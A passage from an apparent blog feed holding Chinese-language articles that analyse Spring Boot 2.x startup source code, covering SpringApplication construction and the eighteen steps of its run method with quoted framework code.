Thread.currentThread().getContextClassLoader();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>5.2）获取 <code>ApplicationContextInitializer</code> 的实例名称集合并去重</strong></p><pre class="line-numbers language-none"><code class="language-none">Set&lt;String&gt; names &#x3D; new LinkedHashSet&lt;&gt;(SpringFactoriesLoader.loadFactoryNames(type, classLoader));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>loadFactoryNames</code> 方法相关的源码如下：</p><pre class="line-numbers language-none"><code class="language-none">public static List&lt;String&gt; loadFactoryNames(Class&lt;?&gt; factoryClass, @Nullable ClassLoader classLoader) &#123;String factoryClassName &#x3D; factoryClass.getName();return loadSpringFactories(classLoader).getOrDefault(factoryClassName, Collections.emptyList());&#125;public static final String FACTORIES_RESOURCE_LOCATION &#x3D; &quot;META-INF&#x2F;spring.factories&quot;;private static Map&lt;String, List&lt;String&gt;&gt; loadSpringFactories(@Nullable ClassLoader classLoader) &#123;MultiValueMap&lt;String, String&gt; result &#x3D; cache.get(classLoader);if (result !&#x3D; null) &#123;return result;&#125;try &#123;Enumeration&lt;URL&gt; urls &#x3D; (classLoader !&#x3D; null ?classLoader.getResources(FACTORIES_RESOURCE_LOCATION) :ClassLoader.getSystemResources(FACTORIES_RESOURCE_LOCATION));result &#x3D; new LinkedMultiValueMap&lt;&gt;();while (urls.hasMoreElements()) &#123;URL url &#x3D; urls.nextElement();UrlResource resource &#x3D; new UrlResource(url);Properties properties &#x3D; PropertiesLoaderUtils.loadProperties(resource);for (Map.Entry&lt;?, ?&gt; entry : properties.entrySet()) &#123;List&lt;String&gt; factoryClassNames &#x3D; Arrays.asList(StringUtils.commaDelimitedListToStringArray((String) entry.getValue()));result.addAll((String) entry.getKey(), factoryClassNames);&#125;&#125;cache.put(classLoader, result);return result;&#125;catch (IOException ex) &#123;throw new IllegalArgumentException(&quot;Unable to load factories from location [&quot; +FACTORIES_RESOURCE_LOCATION + &quot;]&quot;, ex);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据类路径下的 <code>META-INF/spring.factories</code> 文件解析并获取 <code>ApplicationContextInitializer</code> 接口的所有配置的类路径名称。</p><p><code>spring-boot-autoconfigure-2.0.3.RELEASE.jar!/META-INF/spring.factories</code> 的初始化器相关配置内容如下：</p><pre class="line-numbers language-none"><code class="language-none"># Initializersorg.springframework.context.ApplicationContextInitializer&#x3D;\org.springframework.boot.autoconfigure.SharedMetadataReaderFactoryContextInitializer,\org.springframework.boot.autoconfigure.logging.ConditionEvaluationReportLoggingListener<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5.3）根据以上类路径创建初始化器实例列表</strong></p><pre class="line-numbers language-none"><code class="language-none">List&lt;T&gt; instances &#x3D; createSpringFactoriesInstances(type, parameterTypes,classLoader, args, names);private &lt;T&gt; List&lt;T&gt; createSpringFactoriesInstances(Class&lt;T&gt; type,Class&lt;?&gt;[] parameterTypes, ClassLoader classLoader, Object[] args,Set&lt;String&gt; names) &#123;List&lt;T&gt; instances &#x3D; new ArrayList&lt;&gt;(names.size());for (String name : names) &#123;try &#123;Class&lt;?&gt; instanceClass &#x3D; ClassUtils.forName(name, classLoader);Assert.isAssignable(type, instanceClass);Constructor&lt;?&gt; constructor &#x3D; instanceClass.getDeclaredConstructor(parameterTypes);T instance &#x3D; (T) BeanUtils.instantiateClass(constructor, args);instances.add(instance);&#125;catch (Throwable ex) &#123;throw new IllegalArgumentException(&quot;Cannot instantiate &quot; + type + &quot; : &quot; + name, ex);&#125;&#125;return instances;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5.4）初始化器实例列表排序</strong></p><pre class="line-numbers language-none"><code class="language-none">AnnotationAwareOrderComparator.sort(instances);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>5.5）返回初始化器实例列表</strong></p><pre class="line-numbers language-none"><code class="language-none">return instances;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6、设置监听器"><a href="#6、设置监听器" class="headerlink" title="6、设置监听器"></a>6、设置监听器</h4><pre class="line-numbers language-none"><code class="language-none">setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><code>ApplicationListener</code> 的作用是什么？源码如下。</strong></p><pre class="line-numbers language-none"><code class="language-none">@FunctionalInterfacepublic interface ApplicationListener&lt;E extends ApplicationEvent&gt; extends EventListener &#123;&#x2F;** * Handle an application event. * @param event the event to respond to *&#x2F;void onApplicationEvent(E event);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看源码，这个接口继承了 JDK 的 <code>java.util.EventListener</code> 接口，实现了观察者模式，它一般用来定义感兴趣的事件类型，事件类型限定于 ApplicationEvent 的子类，这同样继承了 JDK 的 <code>java.util.EventObject</code> 接口。</p><p>设置监听器和设置初始化器调用的方法是一样的，只是传入的类型不一样，设置监听器的接口类型为：<code>getSpringFactoriesInstances</code>，对应的 <code>spring-boot-autoconfigure-2.0.3.RELEASE.jar!/META-INF/spring.factories</code> 文件配置内容请见下方。</p><pre class="line-numbers language-none"><code class="language-none"># Application Listenersorg.springframework.context.ApplicationListener&#x3D;\org.springframework.boot.autoconfigure.BackgroundPreinitializer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看出目前只有一个 <code>BackgroundPreinitializer</code> 监听器。</p><h4 id="7、推断主入口应用类"><a href="#7、推断主入口应用类" class="headerlink" title="7、推断主入口应用类"></a>7、推断主入口应用类</h4><pre class="line-numbers language-none"><code class="language-none">this.mainApplicationClass &#x3D; deduceMainApplicationClass();private Class&lt;?&gt; deduceMainApplicationClass() &#123;try &#123;StackTraceElement[] stackTrace &#x3D; new RuntimeException().getStackTrace();for (StackTraceElement stackTraceElement : stackTrace) &#123;if (&quot;main&quot;.equals(stackTraceElement.getMethodName())) &#123;return Class.forName(stackTraceElement.getClassName());&#125;&#125;&#125;catch (ClassNotFoundException ex) &#123;&#x2F;&#x2F; Swallow and continue&#125;return null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个推断入口应用类的方式有点特别，通过构造一个运行时异常，再遍历异常栈中的方法名，获取方法名为 main 的栈帧，从来得到入口类的名字再返回该类。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>源码分析内容有点多，也很麻烦，本章暂时分析到 <code>SpringApplication</code> 构造方法的初始化流程，下章再继续分析其 <code>run</code> 方法。</p><p>源码分析不易，点赞 + 转发支持一下吧！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 2.x 启动全过程源码分析（下）运行方法剖析</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.x%20%E5%90%AF%E5%8A%A8%E5%85%A8%E8%BF%87%E7%A8%8B%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89%E8%BF%90%E8%A1%8C%E6%96%B9%E6%B3%95%E5%89%96%E6%9E%90/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%202.x%20%E5%90%AF%E5%8A%A8%E5%85%A8%E8%BF%87%E7%A8%8B%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89%E8%BF%90%E8%A1%8C%E6%96%B9%E6%B3%95%E5%89%96%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>上篇《<a href="https://mp.weixin.qq.com/s/RPU5gwvuWMyzUV8wFZziIw">Spring Boot 2.x 启动全过程源码分析（一）入口类剖析</a>》我们分析了 Spring Boot 入口类 SpringApplication 的源码，并知道了其构造原理，这篇我们继续往下面分析其核心 run 方法。</p><p>[toc]</p><h3 id="SpringApplication-实例-run-方法运行过程"><a href="#SpringApplication-实例-run-方法运行过程" class="headerlink" title="SpringApplication 实例 run 方法运行过程"></a>SpringApplication 实例 run 方法运行过程</h3><p><img src="http://img.javastack.cn/18-7-2/34936854.jpg"></p><p>上面分析了 SpringApplication 实例对象构造方法初始化过程，下面继续来看下这个 SpringApplication 对象的 run 方法的源码和运行流程。</p><pre class="line-numbers language-none"><code class="language-none">public ConfigurableApplicationContext run(String... args) &#123;    &#x2F;&#x2F; 1、创建并启动计时监控类StopWatch stopWatch &#x3D; new StopWatch();stopWatch.start();&#x2F;&#x2F; 2、初始化应用上下文和异常报告集合ConfigurableApplicationContext context &#x3D; null;Collection&lt;SpringBootExceptionReporter&gt; exceptionReporters &#x3D; new ArrayList&lt;&gt;();&#x2F;&#x2F; 3、设置系统属性 &#96;java.awt.headless&#96; 的值，默认值为：trueconfigureHeadlessProperty();&#x2F;&#x2F; 4、创建所有 Spring 运行监听器并发布应用启动事件SpringApplicationRunListeners listeners &#x3D; getRunListeners(args);listeners.starting();try &#123;    &#x2F;&#x2F; 5、初始化默认应用参数类ApplicationArguments applicationArguments &#x3D; new DefaultApplicationArguments(args);&#x2F;&#x2F; 6、根据运行监听器和应用参数来准备 Spring 环境ConfigurableEnvironment environment &#x3D; prepareEnvironment(listeners,applicationArguments);configureIgnoreBeanInfo(environment);&#x2F;&#x2F; 7、创建 Banner 打印类Banner printedBanner &#x3D; printBanner(environment);&#x2F;&#x2F; 8、创建应用上下文context &#x3D; createApplicationContext();&#x2F;&#x2F; 9、准备异常报告器exceptionReporters &#x3D; getSpringFactoriesInstances(SpringBootExceptionReporter.class,new Class[] &#123; ConfigurableApplicationContext.class &#125;, context);&#x2F;&#x2F; 10、准备应用上下文prepareContext(context, environment, listeners, applicationArguments,printedBanner);&#x2F;&#x2F; 11、刷新应用上下文refreshContext(context);&#x2F;&#x2F; 12、应用上下文刷新后置处理afterRefresh(context, applicationArguments);&#x2F;&#x2F; 13、停止计时监控类stopWatch.stop();&#x2F;&#x2F; 14、输出日志记录执行主类名、时间信息if (this.logStartupInfo) &#123;new StartupInfoLogger(this.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);&#125;&#x2F;&#x2F; 15、发布应用上下文启动完成事件listeners.started(context);&#x2F;&#x2F; 16、执行所有 Runner 运行器callRunners(context, applicationArguments);&#125;catch (Throwable ex) &#123;handleRunFailure(context, ex, exceptionReporters, listeners);throw new IllegalStateException(ex);&#125;try &#123;    &#x2F;&#x2F; 17、发布应用上下文就绪事件listeners.running(context);&#125;catch (Throwable ex) &#123;handleRunFailure(context, ex, exceptionReporters, null);throw new IllegalStateException(ex);&#125;&#x2F;&#x2F; 18、返回应用上下文return context;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以，我们可以按以下几步来分解 run 方法的启动过程。</p><h4 id="1、创建并启动计时监控类"><a href="#1、创建并启动计时监控类" class="headerlink" title="1、创建并启动计时监控类"></a>1、创建并启动计时监控类</h4><pre class="line-numbers language-none"><code class="language-none">StopWatch stopWatch &#x3D; new StopWatch();stopWatch.start();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>来看下这个计时监控类 StopWatch 的相关源码：</p><pre class="line-numbers language-none"><code class="language-none">public void start() throws IllegalStateException &#123;start(&quot;&quot;);&#125;public void start(String taskName) throws IllegalStateException &#123;if (this.currentTaskName !&#x3D; null) &#123;throw new IllegalStateException(&quot;Can&#39;t start StopWatch: it&#39;s already running&quot;);&#125;this.currentTaskName &#x3D; taskName;this.startTimeMillis &#x3D; System.currentTimeMillis();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先记录了当前任务的名称，默认为空字符串，然后记录当前 Spring Boot 应用启动的开始时间。</p><h4 id="2、初始化应用上下文和异常报告集合"><a href="#2、初始化应用上下文和异常报告集合" class="headerlink" title="2、初始化应用上下文和异常报告集合"></a>2、初始化应用上下文和异常报告集合</h4><pre class="line-numbers language-none"><code class="language-none">ConfigurableApplicationContext context &#x3D; null;Collection&lt;SpringBootExceptionReporter&gt; exceptionReporters &#x3D; new ArrayList&lt;&gt;();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3、设置系统属性-java-awt-headless-的值"><a href="#3、设置系统属性-java-awt-headless-的值" class="headerlink" title="3、设置系统属性 java.awt.headless 的值"></a>3、设置系统属性 <code>java.awt.headless</code> 的值</h4><pre class="line-numbers language-none"><code class="language-none">configureHeadlessProperty();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置该默认值为：true，Java.awt.headless &#x3D; true 有什么作用？</p><blockquote><p>对于一个 Java 服务器来说经常要处理一些图形元素，例如地图的创建或者图形和图表等。这些API基本上总是需要运行一个X-server以便能使用AWT（Abstract Window Toolkit，抽象窗口工具集）。然而运行一个不必要的 X-server 并不是一种好的管理方式。有时你甚至不能运行 X-server,因此最好的方案是运行 headless 服务器，来进行简单的图像处理。</p><p>参考：<a href="http://www.cnblogs.com/princessd8251/p/4000016.html">www.cnblogs.com/princessd8251/p/4000016.html</a></p></blockquote><h4 id="4、创建所有-Spring-运行监听器并发布应用启动事件"><a href="#4、创建所有-Spring-运行监听器并发布应用启动事件" class="headerlink" title="4、创建所有 Spring 运行监听器并发布应用启动事件"></a>4、创建所有 Spring 运行监听器并发布应用启动事件</h4><pre class="line-numbers language-none"><code class="language-none">SpringApplicationRunListeners listeners &#x3D; getRunListeners(args);listeners.starting();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>来看下创建 Spring 运行监听器相关的源码：</p><pre class="line-numbers language-none"><code class="language-none">private SpringApplicationRunListeners getRunListeners(String[] args) &#123;Class&lt;?&gt;[] types &#x3D; new Class&lt;?&gt;[] &#123; SpringApplication.class, String[].class &#125;;return new SpringApplicationRunListeners(logger, getSpringFactoriesInstances(SpringApplicationRunListener.class, types, this, args));&#125;SpringApplicationRunListeners(Log log,Collection&lt;? extends SpringApplicationRunListener&gt; listeners) &#123;this.log &#x3D; log;this.listeners &#x3D; new ArrayList&lt;&gt;(listeners);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建逻辑和之前实例化初始化器和监听器的一样，一样调用的是 <code>getSpringFactoriesInstances</code> 方法来获取配置的监听器名称并实例化所有的类。</p><p>SpringApplicationRunListener 所有监听器配置在 <code>spring-boot-2.0.3.RELEASE.jar!/META-INF/spring.factories</code> 这个配置文件里面。</p><pre class="line-numbers language-none"><code class="language-none"># Run Listenersorg.springframework.boot.SpringApplicationRunListener&#x3D;\org.springframework.boot.context.event.EventPublishingRunListener<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="5、初始化默认应用参数类"><a href="#5、初始化默认应用参数类" class="headerlink" title="5、初始化默认应用参数类"></a>5、初始化默认应用参数类</h4><pre class="line-numbers language-none"><code class="language-none">ApplicationArguments applicationArguments &#x3D; new DefaultApplicationArguments(args);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="6、根据运行监听器和应用参数来准备-Spring-环境"><a href="#6、根据运行监听器和应用参数来准备-Spring-环境" class="headerlink" title="6、根据运行监听器和应用参数来准备 Spring 环境"></a>6、根据运行监听器和应用参数来准备 Spring 环境</h4><pre class="line-numbers language-none"><code class="language-none">ConfigurableEnvironment environment &#x3D; prepareEnvironment(listeners,applicationArguments);configureIgnoreBeanInfo(environment);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>下面我们主要来看下准备环境的 <code>prepareEnvironment</code> 源码：</p><pre class="line-numbers language-none"><code class="language-none">private ConfigurableEnvironment prepareEnvironment(SpringApplicationRunListeners listeners,ApplicationArguments applicationArguments) &#123;&#x2F;&#x2F; 6.1) 获取（或者创建）应用环境ConfigurableEnvironment environment &#x3D; getOrCreateEnvironment();&#x2F;&#x2F; 6.2) 配置应用环境configureEnvironment(environment, applicationArguments.getSourceArgs());listeners.environmentPrepared(environment);bindToSpringApplication(environment);if (this.webApplicationType &#x3D;&#x3D; WebApplicationType.NONE) &#123;environment &#x3D; new EnvironmentConverter(getClassLoader()).convertToStandardEnvironmentIfNecessary(environment);&#125;ConfigurationPropertySources.attach(environment);return environment;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>6.1) 获取（或者创建）应用环境</strong></p><pre class="line-numbers language-none"><code class="language-none">private ConfigurableEnvironment getOrCreateEnvironment() &#123;if (this.environment !&#x3D; null) &#123;return this.environment;&#125;if (this.webApplicationType &#x3D;&#x3D; WebApplicationType.SERVLET) &#123;return new StandardServletEnvironment();&#125;return new StandardEnvironment();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里分为标准 Servlet 环境和标准环境。</p><p><strong>6.2) 配置应用环境</strong></p><pre class="line-numbers language-none"><code class="language-none">protected void configureEnvironment(ConfigurableEnvironment environment,String[] args) &#123;configurePropertySources(environment, args);configureProfiles(environment, args);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里分为以下两步来配置应用环境。</p><ul><li>配置 property sources</li><li>配置 Profiles</li></ul><p>这里主要处理所有 property sources 配置和 profiles 配置。</p><h4 id="7、创建-Banner-打印类"><a href="#7、创建-Banner-打印类" class="headerlink" title="7、创建 Banner 打印类"></a>7、创建 Banner 打印类</h4><pre class="line-numbers language-none"><code class="language-none">Banner printedBanner &#x3D; printBanner(environment);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是用来打印 Banner 的处理类，这个没什么好说的。</p><h4 id="8、创建应用上下文"><a href="#8、创建应用上下文" class="headerlink" title="8、创建应用上下文"></a>8、创建应用上下文</h4><pre class="line-numbers language-none"><code class="language-none">context &#x3D; createApplicationContext();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来看下 <code>createApplicationContext()</code> 方法的源码：</p><pre class="line-numbers language-none"><code class="language-none">protected ConfigurableApplicationContext createApplicationContext() &#123;Class&lt;?&gt; contextClass &#x3D; this.applicationContextClass;if (contextClass &#x3D;&#x3D; null) &#123;try &#123;switch (this.webApplicationType) &#123;case SERVLET:contextClass &#x3D; Class.forName(DEFAULT_WEB_CONTEXT_CLASS);break;case REACTIVE:contextClass &#x3D; Class.forName(DEFAULT_REACTIVE_WEB_CONTEXT_CLASS);break;default:contextClass &#x3D; Class.forName(DEFAULT_CONTEXT_CLASS);&#125;&#125;catch (ClassNotFoundException ex) &#123;throw new IllegalStateException(&quot;Unable create a default ApplicationContext, &quot;+ &quot;please specify an ApplicationContextClass&quot;,ex);&#125;&#125;return (ConfigurableApplicationContext) BeanUtils.instantiateClass(contextClass);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实就是根据不同的应用类型初始化不同的上下文应用类。</p><h4 id="9、准备异常报告器"><a href="#9、准备异常报告器" class="headerlink" title="9、准备异常报告器"></a>9、准备异常报告器</h4><pre class="line-numbers language-none"><code class="language-none">exceptionReporters &#x3D; getSpringFactoriesInstances(SpringBootExceptionReporter.class,new Class[] &#123; ConfigurableApplicationContext.class &#125;, context);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>逻辑和之前实例化初始化器和监听器的一样，一样调用的是 <code>getSpringFactoriesInstances</code> 方法来获取配置的异常类名称并实例化所有的异常处理类。</p><p>该异常报告处理类配置在 <code>spring-boot-2.0.3.RELEASE.jar!/META-INF/spring.factories</code> 这个配置文件里面。</p><pre class="line-numbers language-none"><code class="language-none"># Error Reportersorg.springframework.boot.SpringBootExceptionReporter&#x3D;\org.springframework.boot.diagnostics.FailureAnalyzers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="10、准备应用上下文"><a href="#10、准备应用上下文" class="headerlink" title="10、准备应用上下文"></a>10、准备应用上下文</h4><pre class="line-numbers language-none"><code class="language-none">prepareContext(context, environment, listeners, applicationArguments,printedBanner);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>来看下 <code>prepareContext()</code> 方法的源码：</p><pre class="line-numbers language-none"><code class="language-none">private void prepareContext(ConfigurableApplicationContext context,ConfigurableEnvironment environment, SpringApplicationRunListeners listeners,ApplicationArguments applicationArguments, Banner printedBanner) &#123;&#x2F;&#x2F; 10.1）绑定环境到上下文context.setEnvironment(environment);&#x2F;&#x2F; 10.2）配置上下文的 bean 生成器及资源加载器postProcessApplicationContext(context);&#x2F;&#x2F; 10.3）为上下文应用所有初始化器applyInitializers(context);&#x2F;&#x2F; 10.4）触发所有 SpringApplicationRunListener 监听器的 contextPrepared 事件方法listeners.contextPrepared(context);&#x2F;&#x2F; 10.5）记录启动日志if (this.logStartupInfo) &#123;logStartupInfo(context.getParent() &#x3D;&#x3D; null);logStartupProfileInfo(context);&#125;&#x2F;&#x2F; 10.6）注册两个特殊的单例beancontext.getBeanFactory().registerSingleton(&quot;springApplicationArguments&quot;,applicationArguments);if (printedBanner !&#x3D; null) &#123;context.getBeanFactory().registerSingleton(&quot;springBootBanner&quot;, printedBanner);&#125;&#x2F;&#x2F; 10.7）加载所有资源Set&lt;Object&gt; sources &#x3D; getAllSources();Assert.notEmpty(sources, &quot;Sources must not be empty&quot;);load(context, sources.toArray(new Object[0]));&#x2F;&#x2F; 10.8）触发所有 SpringApplicationRunListener 监听器的 contextLoaded 事件方法listeners.contextLoaded(context);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="11、刷新应用上下文"><a href="#11、刷新应用上下文" class="headerlink" title="11、刷新应用上下文"></a>11、刷新应用上下文</h4><pre class="line-numbers language-none"><code class="language-none">refreshContext(context);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个主要是刷新 Spring 的应用上下文，源码如下，不详细说明。</p><pre class="line-numbers language-none"><code class="language-none">private void refreshContext(ConfigurableApplicationContext context) &#123;refresh(context);if (this.registerShutdownHook) &#123;try &#123;context.registerShutdownHook();&#125;catch (AccessControlException ex) &#123;&#x2F;&#x2F; Not allowed in some environments.&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="12、应用上下文刷新后置处理"><a href="#12、应用上下文刷新后置处理" class="headerlink" title="12、应用上下文刷新后置处理"></a>12、应用上下文刷新后置处理</h4><pre class="line-numbers language-none"><code class="language-none">afterRefresh(context, applicationArguments);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看了下这个方法的源码是空的，目前可以做一些自定义的后置处理操作。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * Called after the context has been refreshed. * @param context the application context * @param args the application arguments *&#x2F;protected void afterRefresh(ConfigurableApplicationContext context,ApplicationArguments args) &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="13、停止计时监控类"><a href="#13、停止计时监控类" class="headerlink" title="13、停止计时监控类"></a>13、停止计时监控类</h4><pre class="line-numbers language-none"><code class="language-none">stopWatch.stop();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">public void stop() throws IllegalStateException &#123;if (this.currentTaskName &#x3D;&#x3D; null) &#123;throw new IllegalStateException(&quot;Can&#39;t stop StopWatch: it&#39;s not running&quot;);&#125;long lastTime &#x3D; System.currentTimeMillis() - this.startTimeMillis;this.totalTimeMillis +&#x3D; lastTime;this.lastTaskInfo &#x3D; new TaskInfo(this.currentTaskName, lastTime);if (this.keepTaskList) &#123;this.taskList.add(this.lastTaskInfo);&#125;++this.taskCount;this.currentTaskName &#x3D; null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>计时监听器停止，并统计一些任务执行信息。</p><h4 id="14、输出日志记录执行主类名、时间信息"><a href="#14、输出日志记录执行主类名、时间信息" class="headerlink" title="14、输出日志记录执行主类名、时间信息"></a>14、输出日志记录执行主类名、时间信息</h4><pre class="line-numbers language-none"><code class="language-none">if (this.logStartupInfo) &#123;new StartupInfoLogger(this.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="15、发布应用上下文启动完成事件"><a href="#15、发布应用上下文启动完成事件" class="headerlink" title="15、发布应用上下文启动完成事件"></a>15、发布应用上下文启动完成事件</h4><pre class="line-numbers language-none"><code class="language-none">listeners.started(context);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>触发所有 SpringApplicationRunListener 监听器的 started 事件方法。</p><h4 id="16、执行所有-Runner-运行器"><a href="#16、执行所有-Runner-运行器" class="headerlink" title="16、执行所有 Runner 运行器"></a>16、执行所有 Runner 运行器</h4><pre class="line-numbers language-none"><code class="language-none">callRunners(context, applicationArguments);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">private void callRunners(ApplicationContext context, ApplicationArguments args) &#123;List&lt;Object&gt; runners &#x3D; new ArrayList&lt;&gt;();runners.addAll(context.getBeansOfType(ApplicationRunner.class).values());runners.addAll(context.getBeansOfType(CommandLineRunner.class).values());AnnotationAwareOrderComparator.sort(runners);for (Object runner : new LinkedHashSet&lt;&gt;(runners)) &#123;if (runner instanceof ApplicationRunner) &#123;callRunner((ApplicationRunner) runner, args);&#125;if (runner instanceof CommandLineRunner) &#123;callRunner((CommandLineRunner) runner, args);&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行所有 <code>ApplicationRunner</code> 和 <code>CommandLineRunner</code> 这两种运行器，不详细展开了。</p><h4 id="17、发布应用上下文就绪事件"><a href="#17、发布应用上下文就绪事件" class="headerlink" title="17、发布应用上下文就绪事件"></a>17、发布应用上下文就绪事件</h4><pre class="line-numbers language-none"><code class="language-none">listeners.running(context);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>触发所有 SpringApplicationRunListener 监听器的 running 事件方法。</p><h4 id="18、返回应用上下文"><a href="#18、返回应用上下文" class="headerlink" title="18、返回应用上下文"></a>18、返回应用上下文</h4><pre class="line-numbers language-none"><code class="language-none">return context;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Spring Boot 的启动全过程源码分析至此，分析 Spring 源码真是一个痛苦的过程，希望能给大家提供一点参考和思路，也希望能给正在 Spring Boot 学习路上的朋友一点收获。</p><p>源码分析不易，点赞 + 转发支持一下吧！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot Debug调试，日后必定有用</title>
